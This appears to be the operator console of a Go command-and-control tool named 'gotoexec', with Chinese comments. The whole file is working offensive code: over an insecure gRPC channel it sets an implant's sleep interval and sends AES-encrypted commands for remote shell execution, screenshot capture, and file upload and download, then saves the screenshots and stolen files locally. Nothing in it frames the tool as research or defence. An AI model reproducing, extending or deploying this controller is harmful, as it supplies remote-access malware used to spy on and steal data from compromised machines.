package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"google.golang.org/grpc"
	"gotoexec/grpcapi"
	"gotoexec/util"
	"log"
	"os"
	"strconv"
	"strings"
)

func main()  {
	util.Banner()
	var (
		opts []grpc.DialOption
		conn *grpc.ClientConn
		err error
		client grpcapi.AdminClient
		session, ip  string
		sleepTime, port int

	)
	flag.IntVar(&sleepTime,"sleep",0,"sleep time")
	flag.StringVar(&session,"session","","start session")
	flag.StringVar(&ip,"ip","127.0.0.1","Server IP")
	flag.IntVar(&port,"port",1962,"AdminServer Port")
	flag.Parse()
	// WithInsecure 忽略证书
	opts = append(opts, grpc.WithInsecure())
	opts = append(opts, grpc.WithDefaultCallOptions(grpc.MaxCallRecvMsgSize(1024 * 1024 * 12 )))
	opts = append(opts, grpc.WithDefaultCallOptions(grpc.MaxCallSendMsgSize(1024 * 1024 * 12)))
	if conn,err = grpc.Dial(fmt.Sprintf("%s:%d",ip, port),opts...);
	err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewAdminClient(conn)

	if sleepTime != 0 {
		var time = new(grpcapi.SleepTime)
		time.Time = int32(sleepTime)
		ctx := context.Background()
		client.SetSleepTime(ctx,time)
	}

	if session != "" {
		if session == "start" {
			fmt.Println("start exec:")
			for {
				var cmd = new(grpcapi.Command)
				//go中scan、scanf、scanln在输入时都会将空格作为一个字符串的结束
				//fmt.Scan(&command)
				reader := bufio.NewReader(os.Stdin)
				command, _, err := reader.ReadLine()
				if nil != err {
					fmt.Println("reader.ReadLine() error:", err)
				}
				flags := strings.Split(string(command)," ")
				if flags[0] == "exit" {
					return
				}
				if flags[0] == "screenshot" {
					cmd = Run(cmd,command,client)
					images := strings.Split(cmd.Out,";")
					for i, j := range images {
						if j == "" {
							break
						}
						image,err := util.DecryptByAes(j)
						if err != nil {
							log.Fatal(err.Error())
						}
						fileName := strconv.Itoa(i) + ".png"
						err = os.WriteFile(fileName,image,0666)
						if err != nil {
							fmt.Println("截图保存失败！")
						}else {
							fmt.Println("截图保存成功！")
						}
					}
					continue
				}
				if flags[0] == "upload" {
					if len(flags) != 3 || flags[2] == "" {
						fmt.Println("输入格式为：upload 本地文件 目标文件")
						continue
					}
					file, err := os.ReadFile(flags[1])
					if err != nil {
						fmt.Println(err.Error())
						continue
					}
					cmd.Out,err = util.EncryptByAes(file)
					if err != nil {
						log.Fatal(err.Error())
					}
					cmd = Run(cmd,command,client)
					out,err := util.DecryptByAes(cmd.Out)
					if err != nil {
						log.Fatal(err.Error())
					}
					fmt.Println(string(out))
					continue
				}
				if flags[0] == "download" {
					if len(flags) != 3 || flags[2] == "" {
						fmt.Println("输入格式为：download 目标文件 本地文件")
						continue
					}
					cmd = Run(cmd,command,client)
					file, err := util.DecryptByAes(cmd.Out)
					if err != nil {
						log.Fatal(err.Error())
					}
					if string(file[0:13]) == "download err!" {
						fmt.Println(string(file[0:13]))
						continue
					}
					err = os.WriteFile(flags[2],file,0666)
					if err != nil {
						fmt.Println(err.Error())
					}else {
						fmt.Println("download success! Path:" + flags[2])
					}
					continue
				}
				cmd = Run(cmd,command,client)
				out,err := util.DecryptByAes(cmd.Out)
				if err != nil {
					log.Fatal(err.Error())
				}
				cmd.Out = util.ConvertByte2String(out, util.GB18030)
				fmt.Println(cmd.Out)
			}
		} else {
			fmt.Println("please input start")
		}
	}






}

func Run(cmd *grpcapi.Command,command []byte,client grpcapi.AdminClient) *grpcapi.Command{
	var err error
	cmd.In, _ = util.EncryptByAes(command)
	ctx := context.Background()
	//x := *client
	cmd, err =client.RunCommand(ctx, cmd)
	if err != nil {
		log.Fatal("client"+err.Error())
	}
	return cmd
	//result,_ := util.DecryptByAes(cmd.Out)
}